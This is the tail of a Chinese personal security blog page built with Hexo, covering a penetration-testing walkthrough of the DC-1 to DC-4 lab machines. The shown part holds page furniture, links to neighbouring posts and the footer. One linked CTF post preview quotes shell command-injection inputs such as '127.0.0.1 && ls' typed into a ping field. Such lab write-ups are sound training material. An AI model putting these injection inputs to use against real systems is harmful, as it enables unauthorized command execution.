                        <li class="tab wechat-tab waves-effect waves-light"><a class="active" href="#wechat">微信</a></li>
                        <li class="tab alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
                    </ul>
                    <div id="wechat">
                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
                    </div>
                    <div id="alipay">
                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('#reward .reward-link').on('click', function () {
            $('#rewardModal').openModal();
        });

        $('#rewardModal .close').on('click', function () {
            $('#rewardModal').closeModal();
        });
    });
</script>
            

            <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">

<div id="article-share">
    
    <div class="social-share" data-disabled="qzone, qq, weibo, douban"></div>
    
</div>

<script src="/libs/share/js/social-share.min.js"></script>

            <div class="reprint">
                <p>
                    <span class="reprint-tip">
                        <i class="fa fa-exclamation-circle"></i>&nbsp;&nbsp;Reprint please specify:
                    </span>
                    <a href="https://knlvre.github.io" class="b-link-green">Knlvre</a>
                    <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
                    <a href="knlvre.github.io/2019/09/17/DC1-DC4靶机渗透测试/" class="b-link-green">DC-1至DC-4靶机渗透测试</a>
                </p>
            </div>
        </div>
    </div>

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fa fa-chevron-left"></i>&nbsp;Previous</div>
            <div class="card">
                <a href="knlvre.github.io/2019/09/18/DC5-DC8靶机渗透测试/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="DC-5至DC-8靶机渗透测试">
                        
                        <span class="card-title">DC-5至DC-8靶机渗透测试</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary">前言由于网络环境的变化，攻击机和靶机的IP可能发生改变。在每道题目中如果有改变，我会在开头的环境中写出来
转载自安全客原文：https://www.anquanke.com/post/id/187876
DC-5环境虚拟机平台：VMware</div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-09-18
                        </span>
                        <span class="publish-author">
                            
                            <i class="fa fa-user fa-fw"></i>
                            Knlvre
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="knlvre.github.io/tags/渗透测试/" target="_blank">
                        <span class="chip bg-color">渗透测试</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                Next&nbsp;<i class="fa fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="knlvre.github.io/2019/09/05/攻防世界 — Web进阶题（1-10）/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="攻防世界 — Web进阶题(第1-10关)">
                        
                        <span class="card-title">攻防世界 — Web进阶题(第1-10关)</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary">Cat进入题目后给出一个输入框，输入IP地址后会返回PING的信息

此时想到了命令执行，但是尝试127.0.0.1 &amp; ls、127.0.0.1 &amp;&amp; ls、127.0.0.1 | ls都会显示Invalid UR</div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-09-05
                            </span>
                        <span class="publish-author">
                            
                            <i class="fa fa-user fa-fw"></i>
                            Knlvre
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="knlvre.github.io/tags/CTF-Web/" target="_blank">
                        <span class="chip bg-color">CTF-Web</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>
</div>


    </div>
    <div class="col l3 hide-on-med-and-down">
        <div class="toc-widget">
            <div class="toc-title"><i class="fa fa-list-alt"></i>&nbsp;&nbsp;TOC</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            // headingsOffset: -205,
            headingSelector: 'h2, h3, h4'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h2, h3, h4').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });
    });
</script>
    

</main>


<footer class="page-footer bg-color">
    <div class="container row center-align">
        <div class="col s12 m8 l8 copy-right">
            本站由&copy;<a href="https://blinkfox.github.io/" target="_blank">Blinkfox</a>基于
            <a href="https://hexo.io/" target="_blank">Hexo</a> 的
            <a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">hexo-theme-matery</a>主题搭建.

            

            
			
                <br>
                
                <span id="busuanzi_container_site_pv">
                    <i class="fa fa-heart-o"></i>
                    本站总访问量 <span id="busuanzi_value_site_pv" class="white-color"></span>
                </span>
                
                
                <span id="busuanzi_container_site_uv">
                    <i class="fa fa-users"></i>
                    次,&nbsp;访客数 <span id="busuanzi_value_site_uv" class="white-color"></span> 人.
                </span>
                
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">


    <a href="mailto:xxx@xx.xx" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fa fa-envelope-open"></i>
    </a>



    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=123123123" class="tooltipped" data-tooltip="QQ联系我: 123123123" data-position="top" data-delay="50">
        <i class="fa fa-qq"></i>
    </a>


</div>
    </div>
</footer>

<div class="progress-bar"></div>


<!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fa fa-search"></i>&nbsp;&nbsp;Search</span>
            <input type="search" id="searchInput" name="s" placeholder="Please enter a search keyword"
                   class="search-input" autofocus="">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script src="/js/search.js"></script>
<script type="text/javascript">
    searchFunc("knlvre.github.io/" + "search.xml", 'searchInput', 'searchResult');
</script>
<!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fa fa-angle-up"></i>
    </a>
</div>


<script src="/libs/materialize/js/materialize.min.js"></script>
<script src="/libs/masonry/masonry.pkgd.min.js"></script>
<script src="/libs/aos/aos.js"></script>
<script src="/libs/scrollprogress/scrollProgress.min.js"></script>
<script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
<script src="/js/matery.js"></script>

<!-- Global site tag (gtag.js) - Google Analytics -->



    <script src="/libs/others/clicklove.js"></script>


    <script async src="/libs/others/busuanzi.pure.mini.js"></script>


</body>
</html>